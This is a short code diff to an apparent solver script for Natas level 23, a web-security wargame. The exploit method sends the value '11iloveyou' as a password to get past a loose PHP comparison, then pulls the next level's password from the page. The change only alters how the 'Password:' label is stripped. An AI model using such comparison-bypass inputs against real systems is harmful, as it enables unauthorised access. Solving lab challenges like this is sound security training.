@@ -9,6 +9,6 @@ class Level_23(NatasLevel):
   def exploit(self) -> str:
 
     resp  = self.session.get(self.base_url + "/index.php?passwd=11iloveyou")
-    match = re.search(r'Password: (.*)', resp.text, re.MULTILINE).group().replace("Password", "").replace("</pre>", "").strip()
+    match = re.search(r'Password: (.*)', resp.text, re.MULTILINE).group().replace("Password:", "").replace("</pre>", "").strip()
 
     return match
